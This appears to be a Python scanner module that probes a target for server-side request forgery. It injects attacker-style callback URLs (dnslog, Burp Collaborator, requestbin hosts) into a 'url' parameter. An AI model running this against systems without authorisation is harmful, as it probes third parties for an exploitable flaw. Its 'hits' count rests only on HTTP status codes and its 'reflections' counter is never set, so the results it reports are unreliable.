import requests

def run(target):
    payloads = [
        "http://evil.test.dnslog.cn",
        "http://attacker.dnslog.io",
        "http://abc.burpcollaborator.net",
        "http://leak.requestbin.net"
    ]

    reflections = 0
    hits = 0
    sent = 0
    for payload in payloads:
        try:
            url = f"{target}?url={payload}"
            r = requests.get(url, timeout=6)
            sent += 1
            if r.status_code in [200, 302, 403]:
                hits += 1
        except:
            continue

    return {
        "module": "fuzz_dns_hijack",
        "payloads_sent": sent,
        "reflections": reflections,
        "hits": hits,
        "notes": "Check DNS leak via external domains"
    }
